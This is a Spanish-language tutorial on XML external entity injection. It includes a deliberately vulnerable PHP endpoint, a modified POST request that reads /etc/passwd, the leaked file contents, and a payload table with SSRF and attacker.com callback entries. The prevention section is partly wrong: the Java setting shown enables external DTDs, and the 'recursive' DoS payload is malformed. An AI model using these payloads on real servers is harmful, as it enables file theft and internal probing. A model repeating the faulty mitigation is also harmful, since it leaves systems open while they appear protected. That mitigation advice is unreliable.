---
icon: file-xml
---

# XEE (XML External Entity Injection)

## Practica de explotación `XEE`

Por ejemplo si tenemos esta pagina web:

```php
<?php
// Mostrar errores para depuración
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $xml = file_get_contents("php://input"); // Captura el XML enviado

    // Depuración: Mostrar los datos recibidos
    header("Content-Type: text/plain");
    echo "Datos recibidos por el servidor:\n";
    echo "--------------------------------\n";
    echo $xml . "\n\n";

    // 🔥 ACTIVAR XXE (¡Solo para pruebas de seguridad!)
    libxml_disable_entity_loader(false);

    // Procesar el XML
    $dom = new DOMDocument();
    libxml_use_internal_errors(true);
    if ($dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD)) {  // ← Esto permite XXE
        echo "✅ XML cargado correctamente.\n";

        // Aquí procesamos el XML de manera funcional
        echo "📜 Procesando usuarios del XML:\n";

        // Extraer datos de los usuarios del XML
        $users = $dom->getElementsByTagName('user');
        foreach ($users as $user) {
            $id = $user->getElementsByTagName('id')[0]->nodeValue;
            $name = $user->getElementsByTagName('name')[0]->nodeValue;
            $email = $user->getElementsByTagName('email')[0]->nodeValue;
            $address = $user->getElementsByTagName('address')[0]->nodeValue;
            $phone = $user->getElementsByTagName('phone')[0]->nodeValue;

            echo "ID: $id\n";
            echo "Nombre: $name\n";
            echo "Email: $email\n";
            echo "Dirección: $address\n";
            echo "Teléfono: $phone\n\n";
        }

        // Mostrar el contenido completo del XML procesado
        echo "📜 Contenido procesado:\n";
        echo $dom->saveXML();  // Muestra el XML procesado (debería incluir el archivo leído)
    } else {
        echo "❌ Error: XML inválido.\n";
        foreach (libxml_get_errors() as $error) {
            echo "XML Error: " . $error->message . "\n";
        }
        libxml_clear_errors();
    }
} else {
    echo "Envía una solicitud POST con XML.";
}
?>
```

En esta linea de aqui, se produce el `XEE`:

```php
// Procesar el XML
    $dom = new DOMDocument();
    libxml_use_internal_errors(true);
    if ($dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD)) {  // ← Esto permite XXE
```

Si entramos en la pagina principal que sera el `index.html` no veremos nada interesante, pero si nos vamos a `index.php` veremos lo siguiente:

```
Envía una solicitud POST con XML.
```

Por lo que vemos no permite un `GET`, por lo que tendremos que cambiar la peticion a `POST`, por lo que capturaremos el `index.php` con `BupSuite`, una vez capturada la peticion veremos algo asi:

```
GET /index.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Para aprovechar dicha vulnerabilidad, tendremos que dejar la peticion de la siguiente forma:

```
POST /index.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>
```

Ahora si enviamos la peticion, en la pagina veremos lo siguiente:

```
Datos recibidos por el servidor:
--------------------------------
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>

<br />
<b>Deprecated</b>:  Function libxml_disable_entity_loader() is deprecated in <b>/var/www/html/index.php</b> on line <b>16</b><br />
✅ XML cargado correctamente.
📜 Procesando usuarios del XML:
<br />
<b>Warning</b>:  Attempt to read property "nodeValue" on null in <b>/var/www/html/index.php</b> on line <b>30</b><br />
<br />
<b>Warning</b>:  Attempt to read property "nodeValue" on null in <b>/var/www/html/index.php</b> on line <b>32</b><br />
<br />
<b>Warning</b>:  Attempt to read property "nodeValue" on null in <b>/var/www/html/index.php</b> on line <b>33</b><br />
<br />
<b>Warning</b>:  Attempt to read property "nodeValue" on null in <b>/var/www/html/index.php</b> on line <b>34</b><br />
ID: 
Nombre: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
userxml:x:1000:1000:userxml,,,:/home/userxml:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin

Email: 
Dirección: 
Teléfono: 
```

Veremos que hemos podido leer el archivo `passwd`, por lo que ya habremos realizado dicha vulnerabilidad.

## Explicación detallada de la vulnerabilidad `XEE`

### **Vulnerabilidad XEE (XML External Entity Injection)**

**Definición:** La vulnerabilidad **XEE** (Inyección de Entidad Externa XML) ocurre cuando una aplicación web permite la inclusión de entidades externas dentro de archivos XML procesados por el servidor. Los atacantes pueden aprovechar esta vulnerabilidad para acceder a archivos internos del servidor, realizar ataques de denegación de servicio (DoS) o incluso interactuar con servicios internos.

Cuando una aplicación web no valida correctamente las entradas XML, los atacantes pueden inyectar entidades externas en el archivo XML procesado. Estas entidades externas pueden referirse a archivos locales del servidor (como `/etc/passwd` en sistemas Linux) o realizar solicitudes HTTP a servidores controlados por los atacantes.

**Causas comunes:**

1. **Procesadores XML mal configurados:** Muchos procesadores XML permiten la resolución de entidades externas (es decir, la capacidad de incluir archivos externos o realizar solicitudes a recursos externos).
2. **Falta de validación o filtrado adecuado de las entradas XML:** Si no se validan adecuadamente las entradas de los usuarios antes de procesarlas como XML, es fácil que los atacantes inyecten entidades externas.

**Cómo funciona la vulnerabilidad XEE:** La vulnerabilidad XEE se explota cuando un atacante puede incluir una **entidad externa** en un documento XML. Las entidades externas pueden representar archivos locales del sistema, lo que permite a un atacante acceder a esos archivos o incluso ejecutar ataques de denegación de servicio (DoS) mediante la carga de entidades recursivas.

El ataque típicamente se ve en una estructura XML como:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

En este caso, el atacante inyecta una entidad externa que apunta a un archivo del sistema local (`/etc/passwd`), y el servidor incluye ese archivo en la respuesta XML.

### **Impactos de XEE:**

1. **Exfiltración de archivos locales**: Los atacantes pueden obtener acceso a archivos locales del servidor que contienen información sensible, como contraseñas, configuraciones o información de base de datos.
2. **Denegación de servicio (DoS)**: Mediante la inyección de entidades recursivas (entidades que hacen referencia a sí mismas), los atacantes pueden crear ataques de denegación de servicio que agotan los recursos del servidor.
3. **Acceso a recursos internos**: Los atacantes pueden hacer que el servidor haga solicitudes a servicios internos en la red (puertos locales) y obtener información sensible, como datos de bases de datos o servicios internos que no están expuestos al público.
4. **Ejecución remota de comandos**: Aunque menos común, si se permiten ciertas configuraciones, un atacante podría realizar solicitudes externas que interactúan con otros servicios internos del servidor.

***

### **Cómo prevenir la vulnerabilidad XEE:**

1. **Desactivar la resolución de entidades externas**: La mayoría de los procesadores XML permiten configurar la desactivación de la resolución de entidades externas.
   * **Java**: `System.setProperty("javax.xml.accessExternalDTD", "all");`
   * **PHP**: `libxml_disable_entity_loader(true);`
2. **Validar y sanitizar las entradas**: Asegurarse de que los documentos XML sean procesados solo si son válidos y si contienen los datos esperados.
3. **Usar bibliotecas XML seguras**: Utilizar bibliotecas que no procesen entidades externas o que permitan configuraciones estrictas en el manejo de entidades.

***

### **Tabla de Payloads y Bypasses para XEE**

Aquí tienes algunos **payloads comunes y bypasses** para explotar vulnerabilidades XEE, junto con explicaciones de cómo funcionan y cómo pueden ser utilizados.

| **Descripción**                                            | **Payload/Bypass**                                                                                                                                         | **Explicación**                                                                                                                   |
| ---------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| **Acceso a archivos locales (ejemplo: `/etc/passwd`)**     | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <foo>&xxe;</foo>`                                                                              | Permite al atacante acceder a archivos locales sensibles, como el archivo de contraseñas en sistemas Unix (`/etc/passwd`).        |
| **Acceso a archivos sensibles de configuración**           | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]> <foo>&xxe;</foo>`                                                                            | Inyecta una entidad que accede a archivos sensibles del sistema, como el archivo de configuración de nombre de host.              |
| **Denegación de servicio mediante carga recursiva**        | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]> <!ENTITY yxxe SYSTEM "xxe"> <foo>&xxe;&yxxe;</foo>`                                             | Utiliza entidades recursivas para realizar un ataque de DoS, al hacer que el procesador XML recursivamente procese las entidades. |
| **Acceso a servicios internos (puertos locales)**          | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8000/malicious">]> <foo>&xxe;</foo>`                                                                 | Permite al atacante hacer solicitudes HTTP a servicios internos, lo que podría revelar información confidencial o vulnerable.     |
| **Redirección a servidor controlado por atacante**         | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious">]> <foo>&xxe;</foo>`                                                                   | Inyecta una entidad que hace una solicitud HTTP a un servidor externo controlado por el atacante.                                 |
| **Inyección de entidades a través de URL (mediante `&`)**  | `http://victim.com/xml?data=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E` | Inyecta una entidad de archivo en una URL, que es procesada al pasar como parámetro a la aplicación vulnerable.                   |
| **Acceso a archivos XML remotos**                          | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml">]> <foo>&xxe;</foo>`                                                               | Permite al atacante incluir un archivo XML remoto, controlando así el contenido procesado por el servidor.                        |
| **Manipulación de salida para obtener datos del servidor** | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/malicious">]> <foo>&xxe;</foo>`                                                                      | Permite al atacante solicitar información sensible del servidor de forma externa a través de la vulnerabilidad XEE.               |

***

### **Protección contra XEE**

1 **Desactivar el procesador de entidades externas:** Desactivar el procesador de entidades externas en las bibliotecas de XML (si es posible) es una de las mejores formas de prevenir ataques XEE.

Ejemplo en **PHP**:

```xml
libxml_disable_entity_loader(true);
```

Ejemplo en **Java**:

```java
System.setProperty("javax.xml.accessExternalDTD", "all");
```

2 **Validación estricta de las entradas**: Si necesitas procesar XML, valida el contenido y asegúrate de que no contenga entidades externas no deseadas. Puedes restringir el procesamiento de archivos que contengan esas entidades.

3 **Usar bibliotecas XML seguras**: Algunas bibliotecas XML modernas tienen configuraciones que deshabilitan de forma predeterminada la carga de entidades externas. Si es posible, usa estas bibliotecas.

***

#### Conclusión

La vulnerabilidad **XEE** es peligrosa debido a su capacidad para exponer archivos sensibles del servidor y potencialmente permitir ataques de denegación de servicio o interacciones maliciosas con servicios internos. Para evitar esta vulnerabilidad, es crucial que las aplicaciones web utilicen bibliotecas de XML seguras, validen las entradas y configuren los procesadores XML para deshabilitar la resolución de entidades externas.

¡Asegúrate de implementar las mejores prácticas de seguridad para mitigar esta vulnerabilidad en tu aplicación web!
